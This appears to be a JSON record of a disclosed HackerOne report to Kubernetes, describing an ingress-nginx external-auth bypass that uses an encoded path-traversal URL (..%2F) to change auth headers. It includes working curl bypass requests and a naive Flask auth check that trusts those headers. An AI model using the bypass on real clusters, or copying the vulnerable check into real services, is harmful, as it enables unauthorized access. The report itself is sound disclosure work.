{
  "id": 1357948,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xMzU3OTQ4",
  "url": "https://hackerone.com/reports/1357948",
  "title": "Attacker can bypass authentication build on ingress external auth (`nginx.ingress.kubernetes.io/auth-url`)",
  "state": "Closed",
  "substate": "informative",
  "severity_rating": "medium",
  "readable_substate": "Informative",
  "created_at": "2021-10-03T19:44:41.492Z",
  "submitted_at": "2021-10-03T19:44:41.551Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "thisbug",
    "url": "/thisbug",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/iuetpgLdq7RdaaV7h44ZhjY3/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98"
    },
    "is_me?": false,
    "cleared": false,
    "verified": false,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 39386,
    "url": "https://hackerone.com/kubernetes",
    "handle": "kubernetes",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/039/386/486f4380e09776d05a912ca9f46be23f72fe8197_original.png/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/039/386/486f4380e09776d05a912ca9f46be23f72fe8197_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
    },
    "permissions": [],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "profile": {
      "name": "Kubernetes",
      "twitter_handle": "kubernetesio",
      "website": "https://kubernetes.io/",
      "about": ""
    }
  },
  "has_bounty?": true,
  "in_validation?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [],
  "singular_disclosure_disabled": true,
  "disclosed_at": "2022-04-23T07:07:08.925Z",
  "bug_reporter_agreed_on_going_public_at": "2022-04-23T07:07:08.756Z",
  "team_member_agreed_on_going_public_at": "2022-04-22T16:59:11.914Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "Report Submission Form\n\n## Summary:\nSending request with `<public-service>..%2F<protected-service>` allows to manipulate headers:\n\n* X-Original-Url\n* X-Auth-Request-Redirect\n\ndue to that manipulation external auth service could make wrong decision and return 204 instead of 401/403. **To be clear: manipulation of those headers give no possibility to kubernetes user to make any proper decisions based on those headers. ** This way allowing anonymous access to public service and trying to protect access to protected-service by e.g. api-key is not possible.\n\n{F1469913}\n\nExample:\nWith this call `curl -v http://app.test/public-service/..%2Fprotected-service/protected` external auth configured on ingress using `nginx.ingress.kubernetes.io/auth-url: http://auth-service.default.svc.cluster.local:8080/verify` will get following headers:\n```\nX-Request-Id: 7d979c82ca55141ed0d58655fbaac586\nHost: auth-service.default.svc.cluster.local\nX-Original-Url: http://app.test/public-service/..%2Fprotected-service/protected\nX-Original-Method: GET\nX-Sent-From: nginx-ingress-controller\nX-Real-Ip: 192.168.99.1\nX-Forwarded-For: 192.168.99.1\nX-Auth-Request-Redirect: /public-service/..%2Fprotected-service/protected\nConnection: close\nUser-Agent: curl/7.75.0\nAccept: */*\n```\nBoth headers `X-Original-Url` and `X-Auth-Request-Redirect` are manipulated. \n\nHow this auth-service can parse request? Here is simple example of python and Flask:\n```\napi_key = request.headers.get('X-Api-Key')\nrequest_redirect = request.headers.get('X-Auth-Request-Redirect')\n\nif request_redirect and request_redirect.startswith(\"/public-service/\"):\n    return Response(status = HTTPStatus.NO_CONTENT)\n\nif api_key == \"secret-api-key\":  \n    return Response(status = HTTPStatus.NO_CONTENT)\n\nreturn Response(status = HTTPStatus.UNAUTHORIZED)\n```\n\n## Kubernetes Version:\nminikube v1.23.2 on Microsoft Windows 10 Pro 10.0.19043 Build 19043\nKubernetesa v1.22.2 on Docker 20.10.8\n\n## Component Version:\nk8s.gcr.io/ingress-nginx/controller:v1.0.0-beta.3@sha256:44a7a06b71187a4529b0a9edee5cc22bdf71b414470eff696c3869ea8d90a695\n\n## Steps To Reproduce:\n\n  1. Download project in attachment: F1469916\n  2. Install minikube\n  3. Enable addon ingress and ingress-dns\n  4. Build docker images:\n\n    * `cd auth-service; docker build -t auth-service:0.0.4 .`\n    * `cd protected-service; docker build -t protected-service:0.0.1 .`\n    * `cd public-service; docker build -t public-service:0.0.1 .`\n\n  5. push docker images into minikube:\n\n    * `minikube image load auth-service:0.0.4`\n    * `minikube image load protected-service:0.0.1`\n    * `minikube image load public-service:0.0.1`\n\n  6. apply kubernetes configuration: `kubectl apply -f app.yaml`\n\nTo access public service: `curl -v http://app.test/public-service/public`\nTo access protected service: `curl -v http://app.test/protected-service/protected -H \"X-Api-Key: secret-api-key\"`\nTo access protected service bypassing authentication: `curl -v http://app.test/public-service/..%2Fprotected-service/protected`\n\n## Supporting Material/References:\n\n  * in F1469916 - project consist of 2 services: public and protected. Access to public should be available for anyone and to protected only with `X-Api-Key` header. auth-service is protecting access and configured as external auth on ingress.\n    * app.yaml - whole configuration\n    * auth-service, protected-service, public-service - directories with Dockerfiles to build\n\n## Additional note\nAt first I have found this vulnerability in old version of ingress-nginx. It was 0.70.0. With this old version bypass was working without encoding of / to %2F.\ne.g. `curl -v http://app.test/public-service/../protected-service/protected`\nI was not able to reproduce it locally with minikube (couldn't install old ingress addon), but there is possibility that for some older versions of ingress-nginx you don't need to encode / to %2F.\n\n## Impact\n\nAttacker can bypass authentication build on ingress external auth (`nginx.ingress.kubernetes.io/auth-url`). \n\nAttacker can manipulate `X-Original-Url` and `X-Auth-Request-Redirect` headers. Due to this kubernetes user is not able to make safe assumption on those headers.",
  "weakness": {
    "id": 27,
    "name": "Improper Authentication - Generic"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [
    {
      "id": 1469913,
      "file_name": "h1-1.png",
      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/7k2im7rwxmyd0idnqrg1dd0a36q1?response-content-disposition=attachment%3B%20filename%3D%22h1-1.png%22%3B%20filename%2A%3DUTF-8%27%27h1-1.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQXDXMWQX4%2F20240213%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240213T141803Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIBXiIatSvXxAR8ZBwoq9n9qamV3%2Beh4VxZ3KYO4Dx8ipAiBhqaPFcz1fCY4UiwnoQpCKbjkuyniJ5UnHxhrd1V7sPCqxBQh2EAMaDDAxMzYxOTI3NDg0OSIMI7x1nUgRkEN0qOmcKo4FXYYyeBqpZepmBlG%2Bn8RIW4ybBvBDLTs5NzQS7p452M4cH8%2FOy1nnGTSEGOnFuQ1hr8I838Py4bbR2k0%2FeAXwEKBwp9kUx1f6xHqwuZ%2BZJE6IBIkxerlv%2FE3eoTBjleGGo2wwfiOgBypgZ5sXatzcXx72vmVtwhxsDHzFmuJonyOALDBbiuqGbIPREpmA3jUxq%2BMAacTvuf9XMxNE478SaHCKprf1SFobf84oc7fT%2FWNU4UeJ8GNMQeSenAKYY%2BrLefa1UY4wwj6g5D0GjwCVp9bHXI21rt%2BOchx%2BJy%2Ff8hhrWt2fFEziDHK2ejHlzmon20KSav3Ecka%2Fl7q%2FXbFq%2B5cHQ3Fnv6Hsuz%2BtzfIL4EI8nN4PTXJ959QXCgSq68M3r%2FCq038IGGPaf9q5IZ44XiRhpk9WyrUqaUvKDpIG2kZMpC6jLDCikWY%2F0pq0aLMVs8K3zMuHvUvoA%2B2gV%2Bcm6EdoBU1pM0KqEZ4gTsmJdr8mPFqfdK1P4IwECSvHVNNvRZ%2FytigAMyryjJi%2FzrEs38Y9%2FrEkIQq4jS7aMXa2dJvo8qo%2BMpwzgI63Zc9%2BUb7QMMj32n1iEhgvRp0P4HsvjBZW5a45NrCNrdPawRXUjURzopS4c1KkPmoIyqVJLA%2FcZfSuGhSIBnYcB3irx3ar6nXnb1BlJQeYwVq%2BGugPDwYF7JnE98PVLlThTxxkQLe6rmhG98KDMqkM2rSCOaoIoCAr8pyrGNylV531TI6WsbwObHBBin8dGaMs5bPKof2pfOiufJXYwPbUfatl0yR4eeNEDZ2ojVwsNt%2FXz0I%2BnOHi3gFnlaTXXL2pE75y8B8i2gdpWyljLCB%2Bnh8JAX4zJ9W5uSJwboRkdOBCbm1EMOnJra4GOrIBAGTU0E8gZ3I1JcYpghGRH630deXcWBT7WyMmozUTe6qarc28Ss1LWSuryHkoMrH7Sud0DqGFERBVj7YzRXPoLL7BGEhCuNa2uCE2kvLJYBOVb8O0U%2BA8CX4iNwz55KlL7rByi1vNt6ahpUI7DJZTOvkkTX1DSVfQF%2Baicg%2BfMtGKT4Z2J8HGmzqC%2FR%2FqkC6K2vyecQNgl1yG%2BNZWxHLH3sMFQGgXVbyipFgwNo8D0TTcrQ%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=55c95f004cf9a96a3a1e91b40df7fb2d772589f8166e62ca0393c2d510f84343",
      "file_size": 27259,
      "type": "image/png",
      "moderated": null
    },
    {
      "id": 1469916,
      "file_name": "k8s-ingress-auth-bypass.zip",
      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/2ippwb4ryh6c7u8ubfau3o9tbolk?response-content-disposition=attachment%3B%20filename%3D%22k8s-ingress-auth-bypass.zip%22%3B%20filename%2A%3DUTF-8%27%27k8s-ingress-auth-bypass.zip&response-content-type=application%2Fzip&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQXDXMWQX4%2F20240213%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240213T141803Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIBXiIatSvXxAR8ZBwoq9n9qamV3%2Beh4VxZ3KYO4Dx8ipAiBhqaPFcz1fCY4UiwnoQpCKbjkuyniJ5UnHxhrd1V7sPCqxBQh2EAMaDDAxMzYxOTI3NDg0OSIMI7x1nUgRkEN0qOmcKo4FXYYyeBqpZepmBlG%2Bn8RIW4ybBvBDLTs5NzQS7p452M4cH8%2FOy1nnGTSEGOnFuQ1hr8I838Py4bbR2k0%2FeAXwEKBwp9kUx1f6xHqwuZ%2BZJE6IBIkxerlv%2FE3eoTBjleGGo2wwfiOgBypgZ5sXatzcXx72vmVtwhxsDHzFmuJonyOALDBbiuqGbIPREpmA3jUxq%2BMAacTvuf9XMxNE478SaHCKprf1SFobf84oc7fT%2FWNU4UeJ8GNMQeSenAKYY%2BrLefa1UY4wwj6g5D0GjwCVp9bHXI21rt%2BOchx%2BJy%2Ff8hhrWt2fFEziDHK2ejHlzmon20KSav3Ecka%2Fl7q%2FXbFq%2B5cHQ3Fnv6Hsuz%2BtzfIL4EI8nN4PTXJ959QXCgSq68M3r%2FCq038IGGPaf9q5IZ44XiRhpk9WyrUqaUvKDpIG2kZMpC6jLDCikWY%2F0pq0aLMVs8K3zMuHvUvoA%2B2gV%2Bcm6EdoBU1pM0KqEZ4gTsmJdr8mPFqfdK1P4IwECSvHVNNvRZ%2FytigAMyryjJi%2FzrEs38Y9%2FrEkIQq4jS7aMXa2dJvo8qo%2BMpwzgI63Zc9%2BUb7QMMj32n1iEhgvRp0P4HsvjBZW5a45NrCNrdPawRXUjURzopS4c1KkPmoIyqVJLA%2FcZfSuGhSIBnYcB3irx3ar6nXnb1BlJQeYwVq%2BGugPDwYF7JnE98PVLlThTxxkQLe6rmhG98KDMqkM2rSCOaoIoCAr8pyrGNylV531TI6WsbwObHBBin8dGaMs5bPKof2pfOiufJXYwPbUfatl0yR4eeNEDZ2ojVwsNt%2FXz0I%2BnOHi3gFnlaTXXL2pE75y8B8i2gdpWyljLCB%2Bnh8JAX4zJ9W5uSJwboRkdOBCbm1EMOnJra4GOrIBAGTU0E8gZ3I1JcYpghGRH630deXcWBT7WyMmozUTe6qarc28Ss1LWSuryHkoMrH7Sud0DqGFERBVj7YzRXPoLL7BGEhCuNa2uCE2kvLJYBOVb8O0U%2BA8CX4iNwz55KlL7rByi1vNt6ahpUI7DJZTOvkkTX1DSVfQF%2Baicg%2BfMtGKT4Z2J8HGmzqC%2FR%2FqkC6K2vyecQNgl1yG%2BNZWxHLH3sMFQGgXVbyipFgwNo8D0TTcrQ%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=e485cde33ea81822405e629f3fe83ff6d9f3378eb07a2c3b6f470f3a284a1d03",
      "file_size": 5876,
      "type": "application/zip",
      "moderated": null
    }
  ],
  "allow_singular_disclosure_at": null,
  "vote_count": 12,
  "voters": [
    "p4n7h3rx",
    "rondons",
    "alp",
    "zy9ard3",
    "thruster",
    "h4x0r_dz",
    "shivammusic",
    "iqrah0x01",
    "idlefire",
    "csdpl",
    "and 2 more..."
  ],
  "severity": {
    "rating": "medium",
    "score": 6.5,
    "author_type": "Team",
    "metrics": {
      "attack_vector": "network",
      "attack_complexity": "low",
      "privileges_required": "none",
      "user_interaction": "none",
      "scope": "unchanged",
      "confidentiality": "low",
      "integrity": "low",
      "availability": "none"
    }
  },
  "structured_scope": {
    "databaseId": 32524,
    "asset_type": "SOURCE_CODE",
    "asset_identifier": "https://github.com/kubernetes/ingress-nginx",
    "max_severity": "critical"
  },
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
